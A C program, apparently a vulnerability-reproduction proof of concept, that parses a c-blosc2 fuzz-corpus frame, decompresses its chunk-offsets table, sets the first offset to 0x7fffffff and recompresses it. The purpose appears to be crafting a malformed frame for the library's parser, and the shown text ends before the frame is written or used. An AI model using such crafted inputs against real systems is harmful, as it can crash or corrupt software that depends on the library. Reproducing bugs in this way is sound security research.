#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <blosc2.h>

#define FRAME_HEADER_LEN 11
#define FRAME_LEN 16
#define FRAME_NBYTES 30
#define FRAME_CBYTES 39
#define FRAME_TYPESIZE 48
#define FRAME_CHUNKSIZE 53

static int32_t sw32(const uint8_t* p) {
  return (int32_t)((p[0]<<24) | (p[1]<<16) | (p[2]<<8) | p[3]);
}
static int64_t sw64(const uint8_t* p) {
  return (int64_t)(((uint64_t)p[0]<<56) | ((uint64_t)p[1]<<48) | ((uint64_t)p[2]<<40) | ((uint64_t)p[3]<<32) |
         ((uint64_t)p[4]<<24) | ((uint64_t)p[5]<<16) | ((uint64_t)p[6]<<8) | (uint64_t)p[7]);
}

int main() {
  blosc_init();
  
  // Read the seed frame
  FILE* f = fopen("/workspace/repo-vul/src-vul/c-blosc2/tests/fuzz/corpus/frame_simple-blosclz.b2frame", "rb");
  fseek(f, 0, SEEK_END);
  long fsize = ftell(f);
  fseek(f, 0, SEEK_SET);
  uint8_t* frame = malloc(fsize);
  fread(frame, 1, fsize, f);
  fclose(f);
  
  // Parse header
  int32_t header_len = sw32(frame + FRAME_HEADER_LEN);
  int64_t frame_len = sw64(frame + FRAME_LEN);
  int64_t nbytes = sw64(frame + FRAME_NBYTES);
  int64_t cbytes = sw64(frame + FRAME_CBYTES);
  int32_t chunksize = sw32(frame + FRAME_CHUNKSIZE);
  int32_t nchunks = (int32_t)(nbytes / chunksize);
  if (nbytes % chunksize > 0) nchunks++;
  printf("header_len=%d frame_len=%lld nbytes=%lld cbytes=%lld chunksize=%d nchunks=%d\n",
         header_len, (long long)frame_len, (long long)nbytes, (long long)cbytes, chunksize, nchunks);
  
  // The offsets chunk is at header_len + cbytes
  uint8_t* coffsets = frame + header_len + cbytes;
  size_t coffsets_cbytes = frame_len - (header_len + cbytes) - 30;
  printf("coffsets at offset %d, cbytes=%zu\n", header_len + (int)cbytes, coffsets_cbytes);
  
  // Decompress the offsets
  int64_t* offsets = malloc(nchunks * 8);
  blosc2_dparams dparams = BLOSC2_DPARAMS_DEFAULTS;
  blosc2_context* dctx = blosc2_create_dctx(dparams);
  int32_t off_nbytes = blosc2_decompress_ctx(dctx, coffsets, coffsets_cbytes, offsets, nchunks * 8);
  blosc2_free_ctx(dctx);
  printf("decompressed offsets: %d bytes\n", off_nbytes);
  for (int i = 0; i < nchunks; i++) {
    printf("  offset[%d] = %lld\n", i, (long long)offsets[i]);
  }
  
  // Modify the first offset to be a large value
  offsets[0] = 0x7fffffff;
  
  // Recompress the offsets
  uint8_t* new_off_chunk = malloc(nchunks * 8 + BLOSC_MAX_OVERHEAD);
  blosc2_cparams off_cparams = BLOSC2_CPARAMS_DEFAULTS;
  off_cparams.typesize = 8;
  blosc2_context* cctx = blosc2_create_cctx(off_cparams);
  int32_t new_off_cbytes = blosc2_compress_ctx(cctx, offsets, nchunks * 8, new_off_chunk, nchunks * 8 + BLOSC_MAX_OVERHEAD);
  blosc2_free_ctx(cctx);
